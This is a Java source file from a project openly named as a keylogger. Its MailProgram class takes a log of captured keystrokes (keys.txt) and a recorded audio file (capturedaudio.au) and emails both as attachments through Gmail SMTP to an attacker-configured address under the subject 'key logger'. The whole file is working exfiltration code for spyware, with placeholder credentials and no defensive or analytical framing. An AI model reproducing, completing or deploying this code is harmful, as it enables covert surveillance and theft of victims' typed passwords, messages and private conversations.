package com.example.Java_keylogger;

import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.util.Date;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMessage.RecipientType;
import javax.mail.internet.MimeMultipart;
import javax.naming.Context;
import javax.naming.InitialContext;

public class MailProgram {
	private MailProgram() {
	};

	private static final String user = "please enter your mail ID here";
	private static final String PASS = "Generated app password for SMTP for gmail";
	private static final String receiver = "please enter email here, you can mention same email as user in receiver";

	private static Properties emailProperties;

	public static void sendMail(Path file) throws Throwable {
		emailProperties = System.getProperties();
		/*emailProperties.put("mail.smtp.auth", "true");
		emailProperties.put("mail.smtp.starttls.enable", "true");
		//emailProperties.put("mail.smtp.ssl.protocols", "TLSv1.2");
		emailProperties.put("mail.smtp.host", "smtp.gmail.com");
		emailProperties.put("mail.smtp.port", "587");
*/


		emailProperties.put("mail.smtp.host", "smtp.gmail.com");
		emailProperties.put("mail.smtp.port", "465");
		emailProperties.put("mail.smtp.auth", "true");
		emailProperties.put("mail.smtp.starttls.enable", "true");
		emailProperties.put("mail.smtp.starttls.required", "true");
		emailProperties.put("mail.smtp.ssl.protocols", "TLSv1.2");
		emailProperties.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");



		try {
			Session session = Session.getDefaultInstance(emailProperties, new Authenticator() {
				protected PasswordAuthentication getPasswordAuthentication() {
					return new PasswordAuthentication(user, PASS);
				}
			});

			Message Recepientinfo = new MimeMessage(session);
			Recepientinfo.setFrom(new InternetAddress(user));
			Recepientinfo.setRecipients(Message.RecipientType.TO, InternetAddress.parse(receiver, false));
			Recepientinfo.setSubject("key logger");
			BodyPart Recepientinfocontent1 = new MimeBodyPart();  		
			Recepientinfocontent1.setText("Find KeyStrokes in Attached file");      
		   Multipart mailFormat = new MimeMultipart();  
		   mailFormat.addBodyPart(Recepientinfocontent1);
		    String attachfiles="keys.txt";
		    MimeBodyPart attachPart = new MimeBodyPart();
		    
            try {
                attachPart.attachFile(attachfiles);
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            
            mailFormat.addBodyPart(attachPart);
			Recepientinfo.setContent(mailFormat);
			Recepientinfo.setSentDate(new Date());
			Transport.send(Recepientinfo);
			System.out.println("EMAIL SENT.");

			
			String attachaudio="capturedaudio.au";
		    MimeBodyPart attachPart2 = new MimeBodyPart();
		    
            try {
                attachPart2.attachFile(attachaudio);
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            
            mailFormat.addBodyPart(attachPart2);
			Recepientinfo.setContent(mailFormat);
			Recepientinfo.setSentDate(new Date());
			Transport.send(Recepientinfo);
			System.out.println("EMAIL SENT.");
			
			
			
		} catch (MessagingException e) {
			System.out.println("THE MESSAGE WAS FAILED" + e);
		}

	}
}
